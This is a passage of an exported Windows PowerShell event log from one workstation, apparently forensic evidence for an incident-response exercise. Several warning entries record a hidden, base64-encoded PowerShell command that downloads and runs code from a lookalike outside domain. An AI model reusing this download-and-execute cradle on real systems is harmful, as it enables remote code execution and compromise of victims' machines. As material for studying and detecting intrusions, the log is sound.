  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
  "ScriptBlockId": "315ba3af-b123-4918-9c69-d80a1ed1fd32",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:54.255164Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 583,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }",
  "ScriptBlockId": "94159e2d-3dfe-41f7-9d9f-e710282838dc",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:54.253986Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 582,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }",
  "ScriptBlockId": "a27447ed-c17b-4bd8-9916-ddf3e093086a",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:54.249137Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 581,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.PSMessageDetails }",
  "ScriptBlockId": "cc41dd1a-e6d1-4246-8652-fe57f45bda8c",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:54.185319Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4100,
  "RecordID": 580,
  "Level": "Warning",
  "Descr": "<Payload> Context: <ContextInfo>",
  "ContextInfo": "        Severity = Warning\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.145\n        Host ID = b9a32c0b-536a-40bf-8c7b-d00f4c7e33b8\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==\n        Engine Version = 5.1.18362.145\n        Runspace ID = 813f1b7e-a346-4b82-92ba-5b513e0295c5\n        Pipeline ID = 1\n        Command Name = Invoke-WebRequest\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 209\n        User = QL-WKSTN-5693\\j.westcott\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n",
  "UserData": null,
  "Payload": "Error Message = The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. \nFully Qualified Error ID = WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n"
}
{
  "Timestamp": "2023-01-13 17:13:53.822455Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 579,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "cd Music;pwd",
  "ScriptBlockId": "58dc716a-e4de-4713-b3f1-65b7cab8f25c",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:45.594169Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 578,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
  "ScriptBlockId": "b81a26fc-8821-44c4-b32c-c1ef8f625038",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:45.593094Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 577,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }",
  "ScriptBlockId": "a0222dd9-a499-4155-a6c2-68280c0ab1d4",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:45.591938Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 576,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }",
  "ScriptBlockId": "d5ebc7b3-8c3e-4425-851d-601ad1083dbb",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:45.587440Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 575,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.PSMessageDetails }",
  "ScriptBlockId": "ca2bcbbf-aeb7-4aca-a352-9feb2c5e3141",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:45.532953Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4100,
  "RecordID": 574,
  "Level": "Warning",
  "Descr": "<Payload> Context: <ContextInfo>",
  "ContextInfo": "        Severity = Warning\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.145\n        Host ID = b9a32c0b-536a-40bf-8c7b-d00f4c7e33b8\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==\n        Engine Version = 5.1.18362.145\n        Runspace ID = 813f1b7e-a346-4b82-92ba-5b513e0295c5\n        Pipeline ID = 1\n        Command Name = Invoke-WebRequest\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 194\n        User = QL-WKSTN-5693\\j.westcott\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n",
  "UserData": null,
  "Payload": "Error Message = The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. \nFully Qualified Error ID = WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n"
}
{
  "Timestamp": "2023-01-13 17:13:42.358736Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 573,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
  "ScriptBlockId": "6ea15ee6-9275-4037-9613-45dc330ec33f",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:42.357696Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 572,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }",
  "ScriptBlockId": "cd5f58a3-297e-4075-b45d-b60739259a53",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:42.356478Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 571,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }",
  "ScriptBlockId": "4fd52e78-42e4-460a-88f5-fe6604212d4d",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:42.351949Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 570,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.PSMessageDetails }",
  "ScriptBlockId": "563b06b7-3963-46b8-afdb-72a4670b7672",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:42.298500Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4100,
  "RecordID": 569,
  "Level": "Warning",
  "Descr": "<Payload> Context: <ContextInfo>",
  "ContextInfo": "        Severity = Warning\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.145\n        Host ID = b9a32c0b-536a-40bf-8c7b-d00f4c7e33b8\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==\n        Engine Version = 5.1.18362.145\n        Runspace ID = 813f1b7e-a346-4b82-92ba-5b513e0295c5\n        Pipeline ID = 1\n        Command Name = Invoke-WebRequest\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 179\n        User = QL-WKSTN-5693\\j.westcott\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n",
  "UserData": null,
  "Payload": "Error Message = The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. \nFully Qualified Error ID = WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n"
}
{
  "Timestamp": "2023-01-13 17:13:41.908545Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 568,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
  "ScriptBlockId": "98a77e75-c5a8-4847-ba91-436c95d03666",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:41.906304Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 567,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }",
  "ScriptBlockId": "384afb1c-8e4e-45f7-8cc8-3b90c673f593",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:41.902538Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 566,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }",
  "ScriptBlockId": "05a43591-d231-4c00-ace9-3967e7dd817d",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:41.897035Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 565,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.PSMessageDetails }",
  "ScriptBlockId": "eb71d6e9-8f86-4ab0-97bf-13e54b9b885b",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:13:41.807193Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 564,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "cd Public;pwd",
  "ScriptBlockId": "c5439afd-7aa6-4e1f-bf75-170f34613e15",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:12:19.029603Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 563,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.OriginInfo }",
  "ScriptBlockId": "669eb51f-b47e-485b-b79b-569ee2ed3ac0",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:12:19.028519Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 562,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }",
  "ScriptBlockId": "e834fa42-bef8-46c5-a0ee-292dae9aa509",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:12:19.027347Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 561,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }",
  "ScriptBlockId": "69d02b5e-be9c-4e2d-8421-c3587c5e475b",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:12:19.022725Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 560,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.PSMessageDetails }",
  "ScriptBlockId": "63b2b175-f3df-4c73-88f1-7bfcfc037b36",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:12:18.902844Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4100,
  "RecordID": 559,
  "Level": "Warning",
  "Descr": "<Payload> Context: <ContextInfo>",
  "ContextInfo": "        Severity = Warning\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.145\n        Host ID = b9a32c0b-536a-40bf-8c7b-d00f4c7e33b8\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==\n        Engine Version = 5.1.18362.145\n        Runspace ID = 813f1b7e-a346-4b82-92ba-5b513e0295c5\n        Pipeline ID = 1\n        Command Name = Invoke-WebRequest\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 150\n        User = QL-WKSTN-5693\\j.westcott\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n",
  "UserData": null,
  "Payload": "Error Message = The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. \nFully Qualified Error ID = WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n"
}
{
  "Timestamp": "2023-01-13 17:22:48.033748Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 689,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }",
  "ScriptBlockId": "92fc310d-61ee-466e-80e5-ff6776983de6",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:22:48.029154Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4104,
  "RecordID": 688,
  "Level": "Verbose",
  "Descr": "Creating Scriptblock text (<MessageNumber> of <MessageTotal>)",
  "MessageNumber": "1",
  "MessageTotal": "1",
  "ScriptBlockText": "{ Set-StrictMode -Version 1; $_.PSMessageDetails }",
  "ScriptBlockId": "12315367-f55f-44f3-8fc3-3b752ab5ac92",
  "Path": null
}
{
  "Timestamp": "2023-01-13 17:22:47.877523Z",
  "Channel": "Microsoft-Windows-PowerShell/Operational",
  "Provider": "Microsoft-Windows-PowerShell",
  "Hostname": "QL-WKSTN-5693",
  "SID": "S-1-5-21-3258834958-2458682484-3394967329-1002",
  "EventID": 4100,
  "RecordID": 687,
  "Level": "Warning",
  "Descr": "<Payload> Context: <ContextInfo>",
  "ContextInfo": "        Severity = Warning\n        Host Name = ConsoleHost\n        Host Version = 5.1.18362.145\n        Host ID = b9a32c0b-536a-40bf-8c7b-d00f4c7e33b8\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -windowstyle hidden -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==\n        Engine Version = 5.1.18362.145\n        Runspace ID = 813f1b7e-a346-4b82-92ba-5b513e0295c5\n        Pipeline ID = 1\n        Command Name = Invoke-WebRequest\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 478\n        User = QL-WKSTN-5693\\j.westcott\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n",
  "UserData": null,
  "Payload": "Error Message = The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again. \nFully Qualified Error ID = WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n"
}
